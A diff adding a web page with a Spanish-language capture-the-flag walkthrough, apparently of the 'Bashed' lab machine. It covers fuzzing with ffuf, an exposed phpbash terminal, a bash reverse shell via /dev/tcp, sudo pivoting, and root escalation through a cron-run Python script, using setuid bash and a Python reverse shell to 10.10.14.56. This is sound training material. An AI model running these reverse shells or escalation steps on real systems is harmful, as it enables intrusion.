@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>{{ site.title }}</title>
+  <meta name="description" content="{{ site.description }}">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="{{ "/assets/favicon/apple-touch-icon.png" | prepend: site.baseurl }}">
+  <link rel="icon" type="image/png" sizes="32x32" href="{{ "/assets/favicon/favicon-32x32.png" | prepend: site.baseurl }}">
+  <link rel="icon" type="image/png" sizes="16x16" href="{{ "/assets/favicon/favicon-16x16.png" | prepend: site.baseurl }}">
+  <link rel="manifest" href="{{ "/assets/favicon/site.webmanifest" | prepend: site.baseurl }}">
+
+  <link rel="stylesheet" href="{{ "/assets/css/main.min.css" | prepend: site.baseurl }}">
+  <link rel="stylesheet" href="{{ "/assets/css/vendors.min.css" | prepend: site.baseurl }}">
+
+  <script src="{{ "/assets/js/vendors.min.js" | prepend: site.baseurl }}"></script>
+  <script src="{{ "/assets/js/app.min.js" | prepend: site.baseurl }}"></script>
+  <script src="https://cdn.jsdelivr.net/npm/showdown@1.10.3/dist/showdown.min.js"></script>
+  
+
+</head>
+
+<body>
+  <div id ="layout" class="layout">
+    <md># Escaneo</md>
+    <md>Se realiza un primer escaneo para conocer que puertos se encuentran abiertos.
+        En este caso, solo se obtiene un resultado: 80.
+        Visualizando la versión utilizada, se obtiene que se es un servidor Apache
+        bajo la versión 2.4.18.
+      </md>
+      <md># Fuzzing</md>
+      <md>Realizando un escaneo de los directorios y ficheros que se pueden encontrar
+        accesibles en el dominio, en lo relativo a directorios, se pueden localizar _directory
+        listing_. Para esto, se ha utilizado el diccionario _raft-medium-directories.txt_ que
+        se encuentra disponible en el repositorio de github [SecLists](https://github.com/danielmiessler/SecLists).
+      </md>
+      <md>```
+        ffuf -w raft-medium-directories.txt -t 100 -u http://[ip]/FUZZ
+        ```
+      </md>
+
+      <div class = img-github>
+        <md>![Fuzzing directorios | center](../assets/img/bashed/ffuf.png )</md>
+      </div>
+      <md>Por otro lado, en cuanto a ficheros, se observa que el fichero _config.php_ está
+disponible. En este caso se utiliza el direccionario dedicado a ficheros que se
+encuentra en el mismo repositorio.
+      </md>
+      <md>```
+        ffuf -w raft-medium-files.txt -t 100 -u http://[ip]/ FUZZ
+        ```
+      </md>
+      <md># Web</md>
+      <md>La página web que muestra la visita al dominio de la página, enseña como
+        utilizar **phpbash** que se encuentra en el directorio _dev_ encontrado durante la
+        realización de enumeración de directorio y archivos.
+        Al abrir el archivo, este nos muestra una terminal a través del usuario **www-data**.
+      </md>
+      <div class = img-github>
+        <md>![Terminal | center](../assets/img/bashed/terminal.png )</md>
+      </div>
+      <md># Explotación</md>
+      <md>Se ha optado por establecer una _reverse shell_ para continuar la explotación
+        de la máquina. Para conseguir esto se ha utilizado netcat en el dispositivo atacante y una llamada a _reverse shell_ con bash desde la terminal encontrada en
+        el dominio web.
+      </md>
+      <md>```
+        nc - nlvp 4444 # Escucha de todas las conexiones al puerto 4444
+        # Conexion a través de reverse shell
+        bash -c "bash -i >& /dev/tcp/[ip_propia]/[port] 0>&1"
+        ```
+      </md>
+      <md>Para evitar problemas al establecer la reverse shell se cambian los &amp; a código
+        URI, tomando el valor de %26.
+        Desde la raı́z de directorios, se ha viajado al directorio home, en el cual se
+        han descubierto dos usuarios:
+      </md>
+      <md>- arrexel</md>
+      <md>- scriptmanager</md>
+      <md>Al intentar acceder a cada uno de estos directorio se encuentra la _flag_ de
+        usuario asociada al usuario dentro del _/home_ del usuario _arrexel_.
+      </md>
+      <div class = img-github>
+        <md>![User Flag | center](../assets/img/bashed/user.png )</md>
+      </div>
+      <md>Por otro lado, el usuario _scriptmanager_ ha denegado la entrada a su directorio _/home_. Cuando se ha conseguido establecer la conexión a través de una
+        _shell_, se consigue siendo el usuario _www-data_, por lo tanto, el siguiente paso a
+        realizar es la comprobación de los privilegios con los que cuenta dicho usuario,
+        utilizando el comando:
+      </md>
+      <md>```
+        sudo -l
+        ```
+      </md>
+      <div class = img-github>
+        <md>![Permisos | center](../assets/img/bashed/privesc.png )</md>
+      </div>
+      <md>El uso de este comando lista los comandos permitidos por parte del usuario
+        actual. En este caso se ha observado como se puede acceder a través del uso del
+        comando _sudo_ al usuario _scriptmanager_ sin tener que utilizar contraseña. Para
+        lograr esto, se ejecuta:
+      </md>
+      <md>```
+        sudo -u scriptmanager bash -i
+        ```
+      </md>
+      <md>La ejecución de este comando otorga una _shell_ de dicho usuario. Tras una
+comprobación del directorio _/home_ del usuario actual, en el cual no se ha encontrado nada, se ha comprobado los permisos sobre los directorios del directorio
+raı́z.
+      </md>
+      <div class = img-github>
+        <md>![Home scriptmanager | center](../assets/img/bashed/directorios.png )</md>
+      </div>
+      <md>En esta comprobación se aprecia como el usuario _scriptmanager_ es propietario de la carpeta _scripts_.En este, se encuentran hay 2 archivos:
+      </md>
+      <md>1. test.py (propiedad de scriptmanager)</md>
+      <md>2. test.txt (propiedad de root)</md>
+      <md>A continuación, se mostrará la escalada de privilegios de dos posibles formas:</md>
+      <md>1. Modificación de permisos de la bash.</md>
+      <md>2. Estableciendo una nueva reserve shell.</md>
+      <md>Con una breve comprobación se ha observado como el archivo _test.txt_ se
+        ejecuta cada minuto, por lo que se trata de tarea de cron.Los permisos otorgados
+        al archivo _test.py_, permiten su edición.
+      </md>
+      <md>## Modificación de los permisos de bash</md>
+      
+      <md>Teniendo en cuenta que este archivo es ejecutado como usuario administrador, se ha optado por modificar los permisos otorgados a la terminal bash,
+        para activar el _setuid_, el cual otorgará una terminal bajo el usuario _root_ momentáneamente, adquiriendo sobre la terminal unos privilegios mayores a los
+        reales.
+      </md>
+      <md>```
+        import os
+        ```
+      </md>
+      <md>```
+        command = ’chmod u+s /bin/bash’
+        ```
+      </md>
+      <md>```
+        os.system(command)
+        ```
+      </md>
+      <md>Al cabo de un minuto, si se realiza la comprobación de permisos otorgados a
+        la bash, la cual, anteriormente solo tenı́a acceso el usuario _root_, se puede observar
+        como el usuario _scriptmanager_ podrá realizar una ejecución de esta, ya que se
+        le serán otorgados unos privilegios mayores momentaneamente.
+      </md>
+      <div class = img-github>
+        <md>![Bash permissions | center](../assets/img/bashed/permisos_bash.png )</md>
+      </div>
+      <md>## Establecimiento de una reverse shell</md>
+      <md>Otra posible solución a esta escalada de privilegios es el establecimiento de
+        una nueva _reverse shell_ que será llamada desde el script _test.py_ que se ejecuta
+        cada minuto. En este caso al tratase de un script de python, el código estblecido
+        ha sido el siguiente:
+      </md>
+      <md>```
+        import socket,subprocess,os ;
+        ```
+      </md>
+      <md>```
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+        ```
+      </md>
+      <md>```
+        s.connect(("10.10.14.56",4445));
+        ```
+      </md>
+      <md>```
+        os.dup2(s.fileno(),0);
+        ```
+      </md>
+      <md>```
+        os.dup2(s.fileno(),1);
+        ```
+      </md>
+      <md>```
+        os.dup2(s.fileno(),2);
+        ```
+      </md>
+      <md>```
+        p = subprocess.call(["/bin/sh","-i"]);
+        ```
+      </md>
+      <md>En otra terminal se activa el comando **nc -nlvp 4445**, el cual permanecerá
+        a la escucha de nuevas conexiones. Al cabo de un minuto, se ejecutará una _shell_
+        en dicho terminal, siendo el usuario _root_. Al visitar el directorio root que se
+        encuentra en la carpeta raı́z, se localiza la _flag_ restante, perteneciente a este
+        usuario.
+      </md>
+      <div class = img-github>
+        <md>![Root Flag | center](../assets/img/bashed/root.png )</md>
+      </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/gh/MarketingPipeline/Markdown-Tag/markdown-tag.js"></script> 
+</body>
+</html>
